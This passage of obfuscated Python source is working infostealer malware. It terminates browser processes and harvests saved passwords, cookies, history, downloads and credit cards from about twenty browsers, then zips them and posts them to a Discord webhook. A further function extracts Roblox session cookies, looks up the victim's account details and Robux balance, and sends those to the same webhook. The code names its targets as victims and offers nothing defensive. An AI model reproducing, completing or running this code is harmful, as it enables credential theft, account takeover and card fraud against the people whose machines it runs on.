            files_in_memory[f"Downloads_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt"] = '\n'.join(HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ)

        if BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG:
            files_in_memory[f"Cards_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt"] = '\n'.join(BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def RWNBOYIJOAWOITUDIJSGETRDOWHHPPLPFVGUASIVADMFOGSIKGGJOPOOWTMFEDTCJUCIMEZCUUXJDORVDGTUR(IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG, zip_in_memory):
        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)
        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(
            embed=Embed(
                title=f'Browser Steal {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:',
                description=f"Found In **{'**, **'.join(ICXYVGXFJGZZQPVMGQIIGOGFCIGEPEXUMWLLUASTANKDJLFKZZHECSACXHUSPTQOEJCQMGLMVBMCHNUOPGEVXZIPOVAFJZIGAH)}**: ```📂 - Browser_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.zip\n├── 📄 - Cards_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt\n├── 📄 - Cookies_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt\n├── 📄 - Downloads_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt\n├── 📄 - History_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt\n└── 📄 - Passwords_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.txt```",
                color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX,
            ).set_footer(
                text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV,
                icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.zip"), 
            username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM
        )
        
    FGTZDVPFCWSKMLKWIPDFSXYCSTFXISRUZKKINQHWVHJUZVLVDWDUMLJOWVMOKBBRFXLGEKQOGPSDZMVISMTK = {
        'Google Chrome': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Amigo', 'User Data'),
        'Torch': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Torch', 'User Data'),
        'Kometa': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR, 'Apple Computer', 'Safari'),
    }

    FGTZDVPFCWSKMLKWIPDFSXYCSTFXISRUZKKINQHWVHJUZVLVDWDUMLJOWVMOKBBRFXLGEKQOGPSDZMVISMTK_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    FMFSQGHYWCXUYOQQXXRZQXJMRTCATGMJDNDQBWCVQONAPTDXDHZDCIVZVGHWN = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in FGTZDVPFCWSKMLKWIPDFSXYCSTFXISRUZKKINQHWVHJUZVLVDWDUMLJOWVMOKBBRFXLGEKQOGPSDZMVISMTK_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY in FGTZDVPFCWSKMLKWIPDFSXYCSTFXISRUZKKINQHWVHJUZVLVDWDUMLJOWVMOKBBRFXLGEKQOGPSDZMVISMTK.items():
        if not os.path.exists(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY):
            continue

        MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM = KRGGXTMYYEWIVYSQFRMUZLWXZTWNIWZOJBABDVMGGQDKKHGXNOT(os.path.join(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY, 'Local State'))
        if not MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM:
            continue

        for v4r_profile in FMFSQGHYWCXUYOQQXXRZQXJMRTCATGMJDNDQBWCVQONAPTDXDHZDCIVZVGHWN:
            JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH = os.path.join(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY, v4r_profile)
            if not os.path.exists(JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH):
                continue
            
            try: WZUVYEKGUBXNGFIDLLSRHZEVHZJPXQJCPDIVROUSJMPALPJOPBAXONMRZNEODKUQMCUHNDUYRGDGFQEULEEH(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)
            except: pass
            try: VDCEZBUFMFUPXITAULYGZAYJTMPMUSEBSYPMEAAJCMPYNZCQRFWWVUGFXOCYMPSWIRZHJSQPFKTTUBKVRF(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)
            except: pass
            try: DEKRKHMPPPNNESCMCHTSSNOWOOHJQXPBUHQGGBAVOTOEWUCPZCKEJKBWRLXDRGARGTIPJBSZBXRIOFLGSZCFEUTPRRPKPCSM(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH)
            except: pass
            try: ZUJCDTYTLABAPBXRQATQOEPVJMEPPQTFMYOLPUJASZYTDWWDAMYGKELTEFCBQZMBYRBVMUNJBLU(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH)
            except: pass
            try: LNCMNUWEKUUVFUXSYSJLAFZGDJPGCQNPTCRDMTEAPKPLICIIKBFQWL(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU, JQDVSJVKGBCBFZTVTQWQIWTUNUKGZWLHVIULZWWWORFBNCVPBLWJRQZTOAFH, MGJNFXVPCHIMEGZVCOLVSGKQPMMPVTMNGGLYLLMDNVANRBIOZTPDLVXVLDUFLDHCJUKOM)
            except: pass

            if WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU not in ICXYVGXFJGZZQPVMGQIIGOGFCIGEPEXUMWLLUASTANKDJLFKZZHECSACXHUSPTQOEJCQMGLMVBMCHNUOPGEVXZIPOVAFJZIGAH:
                ICXYVGXFJGZZQPVMGQIIGOGFCIGEPEXUMWLLUASTANKDJLFKZZHECSACXHUSPTQOEJCQMGLMVBMCHNUOPGEVXZIPOVAFJZIGAH.append(WEELYOEHKZCKSIULSTKCTGRYKMTDEEXWOWOBATIRVAMGDGLUZVU)
            
    if not ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO:
        ZGRZHPSFENLKNYPVMARMIQSKKYAJPBWPDOJVDYHHEXGPEWZEXRVWBDDEMJMFZVJHFZALQDDVHTJDKIGFQVLEYBILMISAWUIMSBO.append("No passwords was saved on the victim's computer")
    if not MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN:
        MHYNYXQJCFPCSZBRXEZYIKCOLHNJCFYJTMYGEUAVIDPYDQJAVTSZXBCJJKFBBZPBLTMKXWKPDVEPEAMJKN.append("No cookies was saved on the victim's computer")
    if not HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL:
        HRJFIJLKDPGBYQMWSHUDNJXXTNKISJHGAGICFZVULMYDAYMRORL.append("No history was saved on the victim's computer")
    if not HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ:
        HYMMHGBLQAIJYEQNDNOJRJWURKPGXXXNGVMQBVOZWASBUWPOVKKUMQ.append("No downloads was saved on the victim's computer")
    if not BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG:
        BJRPTLTHZFLTOXSGSUGJKNCQVGLQCHNWVCCDOZBBVHFAFFCOKNPBZHEZXWCRGNHHXLZZADGBJXRYYCPNOQQMQEJXWMFNPPG.append("No card was saved on the victim's computer")

    zip_in_memory = SEGDFMCOTSEMQEPNAGSUGISZMRYTGSKFMBFKQCSRFFUSGDYUNJDTBXHBZQYTLCEEBJJRYAPSWKHEDVVIFXHEGUQTS(IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG)
    RWNBOYIJOAWOITUDIJSGETRDOWHHPPLPFVGUASIVADMFOGSIKGGJOPOOWTMFEDTCJUCIMEZCUUXJDORVDGTUR(IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG, zip_in_memory)

def YHBAYPPFTTEIPHOYLNYRRXYEZDLQUPZZOPJLLFWBXXFMPGYUCQPAGWNZDKQUDGVLJYVLYGWEEASMBGTQOQPBSWNRHLBIWG():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook
    import discord

    DSVBPCFRDAXTDIFMOCQKYUBTXKDGQQRVZUGPYCYGCMBTUOQCGQVGHZJL = []
    def UZAPCZYNRESRWRGLMSOWQOFPRWNMLSKSCRKHUYFUKZFNUSXLJTPGUBPADQFLGLJMOOBHLRGCXTXIIAVDDTBYJIQJNMBZICUBDC(PJCRJSHYAFAZRMSYZCSUTFCUJFXHMJNCEMKPHKSXNGVWIRMWRZGTDSYGESMQIPKGPSOGLZCNFXEAZDDSRMBBHIZRRZJY):
        try:
            MMWPVUJCOIRSCADOROUYSTFLJHZZRJVJHLSKFPLGSDEXGHGHGIMGANJDLXCNCGPULBQNCYUMRWVBMJUIZVDAG = PJCRJSHYAFAZRMSYZCSUTFCUJFXHMJNCEMKPHKSXNGVWIRMWRZGTDSYGESMQIPKGPSOGLZCNFXEAZDDSRMBBHIZRRZJY()
            MMWPVUJCOIRSCADOROUYSTFLJHZZRJVJHLSKFPLGSDEXGHGHGIMGANJDLXCNCGPULBQNCYUMRWVBMJUIZVDAG = str(MMWPVUJCOIRSCADOROUYSTFLJHZZRJVJHLSKFPLGSDEXGHGHGIMGANJDLXCNCGPULBQNCYUMRWVBMJUIZVDAG)
            JMLYUWLGJXDKBDNVZABMOBPIWGLKHOUKRSVMMTEXBZTLYJDXFFIPKKUYHPNCZVZKBHOODHFGP = MMWPVUJCOIRSCADOROUYSTFLJHZZRJVJHLSKFPLGSDEXGHGHGIMGANJDLXCNCGPULBQNCYUMRWVBMJUIZVDAG.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            DVSFPZBUNWHKTDLGNHVGEBWDKVNGWQJCOLXGMIEPFHHVVWRWHOCOLPEQRPDPLIJKFXJBLWBWKWTYIUEPYT = PJCRJSHYAFAZRMSYZCSUTFCUJFXHMJNCEMKPHKSXNGVWIRMWRZGTDSYGESMQIPKGPSOGLZCNFXEAZDDSRMBBHIZRRZJY.__name__
            return JMLYUWLGJXDKBDNVZABMOBPIWGLKHOUKRSVMMTEXBZTLYJDXFFIPKKUYHPNCZVZKBHOODHFGP, DVSFPZBUNWHKTDLGNHVGEBWDKVNGWQJCOLXGMIEPFHHVVWRWHOCOLPEQRPDPLIJKFXJBLWBWKWTYIUEPYT
        except:
            return None, None

    def IXJRWNIKUPBHVRBSFIASCJBZBNFAXHYJLAQKEHAWUQSKTCCAJSLYNB():
        return browser_cookie3.edge(domain_name="roblox.com")

    def LCBSTUKJUOKYFIXSAMMBFRSBFRSXXVTCSWBMKLEYMPXZCKEUIHIG():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def HWUKJFRFWHKMNSKCZIQPPHNOFZYLJAJVBQBPRRCWEXXIGJJVKYVQUGPHXIVQYYPQUARTOZRTBYAJHTZRYNJ():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def XMBLCUIEBCNQTCVQTALSTZZYZQWNXFWUFUCKFUIWUOYOLPHCDFNEIBZVQBMUQTYLLWPQ():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def XMBLCUIEBCNQTCVQTALSTZZYZQWNXFWUFUCKFUIWUOYOLPHCDFNEIBZVQBMUQTYLLWPQGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def QMWRHDJGUMQRMPZTVGGFUWNFPGBDNGBSXWNWJFTEHNDEGHVWYVZ():
        return browser_cookie3.safari(domain_name="roblox.com")

    def UDKKNRZAKLZELKVIARIOTAYXGYVMFRFIMIBLLLAGVNKSNQSQDSHZSMUUYMCMBFDSPLFHHHSXVIUSNTCBVHN():
        return browser_cookie3.brave(domain_name="roblox.com")

    GNFMALFSJNSBTGHNWHRQCZSPCEBIYMHLCLYULSICSVWOWQIFNJGBCTQLCNJUVHBCYUNEVTKFEGAJBGXNQHMKW = [IXJRWNIKUPBHVRBSFIASCJBZBNFAXHYJLAQKEHAWUQSKTCCAJSLYNB, LCBSTUKJUOKYFIXSAMMBFRSBFRSXXVTCSWBMKLEYMPXZCKEUIHIG, HWUKJFRFWHKMNSKCZIQPPHNOFZYLJAJVBQBPRRCWEXXIGJJVKYVQUGPHXIVQYYPQUARTOZRTBYAJHTZRYNJ, XMBLCUIEBCNQTCVQTALSTZZYZQWNXFWUFUCKFUIWUOYOLPHCDFNEIBZVQBMUQTYLLWPQ, XMBLCUIEBCNQTCVQTALSTZZYZQWNXFWUFUCKFUIWUOYOLPHCDFNEIBZVQBMUQTYLLWPQGX, QMWRHDJGUMQRMPZTVGGFUWNFPGBDNGBSXWNWJFTEHNDEGHVWYVZ, UDKKNRZAKLZELKVIARIOTAYXGYVMFRFIMIBLLLAGVNKSNQSQDSHZSMUUYMCMBFDSPLFHHHSXVIUSNTCBVHN]
    for v4r_br0ws3r in GNFMALFSJNSBTGHNWHRQCZSPCEBIYMHLCLYULSICSVWOWQIFNJGBCTQLCNJUVHBCYUNEVTKFEGAJBGXNQHMKW:
        v4r_c00ki3, DVSFPZBUNWHKTDLGNHVGEBWDKVNGWQJCOLXGMIEPFHHVVWRWHOCOLPEQRPDPLIJKFXJBLWBWKWTYIUEPYT = UZAPCZYNRESRWRGLMSOWQOFPRWNMLSKSCRKHUYFUKZFNUSXLJTPGUBPADQFLGLJMOOBHLRGCXTXIIAVDDTBYJIQJNMBZICUBDC(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in DSVBPCFRDAXTDIFMOCQKYUBTXKDGQQRVZUGPYCYGCMBTUOQCGQVGHZJL:
                DSVBPCFRDAXTDIFMOCQKYUBTXKDGQQRVZUGPYCYGCMBTUOQCGQVGHZJL.append(v4r_c00ki3)
                try:
                    KLSMSROXUEVLXDJCPBLKJPPWXIJDFUZURURFWKVFSCGDPNQCYQZICGYKOMLQBOPFFKAZBRXHTIJPKXIYSFBEOYUWPYC = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG = json.loads(KLSMSROXUEVLXDJCPBLKJPPWXIJDFUZURURFWKVFSCGDPNQCYQZICGYKOMLQBOPFFKAZBRXHTIJPKXIYSFBEOYUWPYC.text)
                except:
                    pass

                IAAMJLGQFCJUPUXXCIOGIITFWMLKUNWMUQXQKCVRLFOBEMEWEIPETQZBJWADZOQEUHFTSLV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('id', "None")
                ZCVYHARGCNQRUIALSKEBMGSJSZOWJGXLDFDLZQYVZRIBXMUKKNOXAXH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('displayName', "None")
                MEYELBZCCOATKDLXLYEZIKPVNIWTWBUMUZNRDTDPHPWJRNAPYYFDOAWQTMDZHHDWEZSSWUBNAAXJCOJKDKFIEZEDCMS = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('name', "None")
                YBDNNQXPLJNEEEIPAIUIRCKBIBIVZBAKFPHYGLKICNLXRVDGZKXDSWNQUFBVDXSHEWSUPEMAHVVKAMWLJQCZHG = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get("RobuxBalance", "None")
                JVBZWDBVUBQSOWKAZEHSEDAQXRJKWEETSGYAQIJNWAEUOOTRIRBPIAUCEFBLMJZBJANKAEFJBMXRZIPIGSS = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get("IsPremium", "None")
                SSWNUKIFVNMIQKXFPUAWHUOTMCPXJUAGPKGCBGZXDGYKDNNQDBPRNMWIGCOCXFWAHSBRNJLLAPKVZTKQSVGHTJKZGGEECVR = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get("ThumbnailUrl", "None")
                CGSLSHNDCBEDIGDTTSREYACRMSJHZXBCDUNEUIBTQTHNUAMZRIQQTBFJSLQYVMKHNUMTLAIUJFMUNKTUSTWKWVZSXZCHP = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get("IsAnyBuildersClubMember", "None")
        
                FTRSNGXCGLHNLSYDYGYDOPOQINAIOVGMZXNLVDDMHGRBNQPQWNHSTPTVIIIYMUZVXXXORYFDEIPGCTQBOZEHVVHEDEBXMTMQ = len(v4r_c00ki3)
                LEVIWSKHMUHGFWPWMVVDQVRZCUVKSSNMUISVNEHOCPDJMLZHBEHBASYZGKTBYURPDOOFRRWMUHDC = FTRSNGXCGLHNLSYDYGYDOPOQINAIOVGMZXNLVDDMHGRBNQPQWNHSTPTVIIIYMUZVXXXORYFDEIPGCTQBOZEHVVHEDEBXMTMQ // 2
                SAHCJGXHQXTBUPPAMEYOWFMZTDLNEAKVXZYJBKCFDIJALUGWQYXTNQQKNIAHQWZNUPSV = v4r_c00ki3[:LEVIWSKHMUHGFWPWMVVDQVRZCUVKSSNMUISVNEHOCPDJMLZHBEHBASYZGKTBYURPDOOFRRWMUHDC]
                ZEKMXEDEVQWQCJOWDXPNHFWYNVVDWJYXJMHYEQCMQOFKALEHNLCWQKFABLLJCITJMH = v4r_c00ki3[LEVIWSKHMUHGFWPWMVVDQVRZCUVKSSNMUISVNEHOCPDJMLZHBEHBASYZGKTBYURPDOOFRRWMUHDC:]

                BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)

                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR = discord.Embed(
                    title=f'Roblox Cookie {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:',
                    color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX
                )
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.set_thumbnail(url=SSWNUKIFVNMIQKXFPUAWHUOTMCPXJUAGPKGCBGZXDGYKDNNQDBPRNMWIGCOCXFWAHSBRNJLLAPKVZTKQSVGHTJKZGGEECVR)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":compass: Navigator:", value=f"```{DVSFPZBUNWHKTDLGNHVGEBWDKVNGWQJCOLXGMIEPFHHVVWRWHOCOLPEQRPDPLIJKFXJBLWBWKWTYIUEPYT}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":bust_in_silhouette: Username:", value=f"```{MEYELBZCCOATKDLXLYEZIKPVNIWTWBUMUZNRDTDPHPWJRNAPYYFDOAWQTMDZHHDWEZSSWUBNAAXJCOJKDKFIEZEDCMS}```", inline=True)
